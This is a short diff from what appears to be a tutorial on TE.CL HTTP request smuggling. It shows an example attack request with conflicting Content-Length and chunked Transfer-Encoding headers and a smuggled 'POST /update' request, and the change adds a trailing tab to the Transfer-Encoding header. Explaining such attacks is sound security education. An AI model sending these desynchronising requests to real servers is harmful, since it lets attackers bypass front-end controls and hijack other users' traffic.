@@ -59,7 +59,7 @@ TE.CL stands for Transfer-Encoding/Content-LengthTo exploit the TE.CL technique,
 POST / HTTP/1.1
 Host: example.com
 Content-Length: 4
-Transfer-Encoding: chunked
+Transfer-Encoding: chunked	
 
 4c
 POST /update HTTP/1.1
